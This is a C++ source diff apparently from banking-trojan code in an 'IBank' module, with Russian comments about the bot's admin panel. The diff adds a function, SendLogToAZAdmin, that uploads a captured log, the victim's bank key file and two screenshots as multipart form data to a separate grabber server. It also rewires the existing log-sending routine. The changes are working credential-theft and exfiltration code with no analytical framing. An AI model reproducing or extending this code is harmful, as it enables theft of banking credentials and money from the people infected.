@@ -25,7 +25,6 @@
 #include "Utils.h"
 #include "VideoRecorder.h"
 #include "BotHTTP.h"
-#include "JavaConfig.h"
 
 #include "Modules.h"
 
@@ -62,7 +61,7 @@ namespace IBank
 
 
 
-	char SystemName[]   = {'I', 'B', 'A', 'N', 'K',  0};
+	char SystemName[]   = {'i', 'b', 'a', 'n', 'k',  0};
 
 	//-----------------------------------------------------------------------
 	typedef struct TIBankLog
@@ -462,29 +461,14 @@ namespace IBank
 	}
 	//-----------------------------------------------------------------------
 
-	PCHAR inline GetIBankURL(bool UseMainHosts)
-	{
-		// Функция возвращает адрес скрипта для отправки лога
-
-		#ifdef JavaConfigH
-			if (!UseMainHosts)
-				return GetJavaScriptURL(IBankLogPathJavaHost);
-		#endif
-
-		return GetBotScriptURL(SCRIPT_IBANK_LOG);
-    }
-
-	//-----------------------------------------------------------------------
-
-	BOOL SendLogToAdmin(PIBankLog L, bool UseMainHosts)
+	BOOL SendLogToAdmin(PIBankLog L)
 	{
 		// Функция отправляет данные на необъодимую админку
 		// UseMainHosts - Указание отправлять лог на основную админку
-		if (UseMainHosts)
-			IBDBG("IBank", "Отправляем лог на основную админку бота");
+		IBDBG("IBank", "Отправляем лог на основную админку бота");
 		BOOL Result = FALSE;
-		PCHAR URL = GetIBankURL(UseMainHosts);
-	    
+		PCHAR URL = GetBotScriptURL(SCRIPT_IBANK_LOG);
+
 		if (URL)
 		{    
 			Result = SendLog(URL, L);
@@ -493,6 +477,32 @@ namespace IBank
 		IBDBG("IBank", "Отправляем лог. [Result=%d] [URL=%s]", Result, URL);
 		return Result;
 	}
+	//-----------------------------------------------------------------------
+	#ifdef JavaConfigH
+	BOOL SendLogToAZAdmin(PIBankLog L)
+	{
+		// Функция отправляет лог в админку аз
+		IBDBG("IBank", "Отправляем лог на основную админку бота");
+		string URL = GetAzGrabberURL(SystemName);
+		if (URL.IsEmpty()) return FALSE;
+
+		// Формируем отправляемые данные
+		TMultiPartData Data;
+		Data.Add("txt[log]",  L->Log);
+		Data.AddFile("file[Key]", L->KeyFile, NULL, NULL);
+		Data.AddBlobAsFile("file[Screen1]", "Screen1.png", L->StartScreenShot.Data, L->StartScreenShot.Size, NULL);
+		Data.AddBlobAsFile("file[Screen2]", "Screen2.png", L->EndScreenShot.Data, L->EndScreenShot.Size, NULL);
+
+		BOOL Result = FALSE;
+		THTTP H;
+		H.CheckOkCode = false;
+		string Doc;
+		if (H.Post(URL.t_str(), &Data, Doc))
+			Result = H.Response.Code == 403;
+		IBDBG("IBank", "Отправляем лог в админку АЗ. [Result=%d]", Result);
+		return Result;
+	}
+	#endif
 	//-----------------------------------------------------------------------
 
 
@@ -510,13 +520,13 @@ namespace IBank
 		{
 			// Отправляем лог на основную админку бота
 			if (!Sended1)
-				Sended1 = SendLogToAdmin(L, true);  
+				Sended1 = SendLogToAdmin(L);
 
 			#ifdef JavaConfigH
 				// Если включен модуль ява хостов то, отправляем
 				// лог и на эту админку.
 				if (!Sended2)
-					Sended2 = SendLogToAdmin(L, false);
+					Sended2 = SendLogToAZAdmin(L);
 			#else
 				Sended2 = TRUE; 	
 			#endif
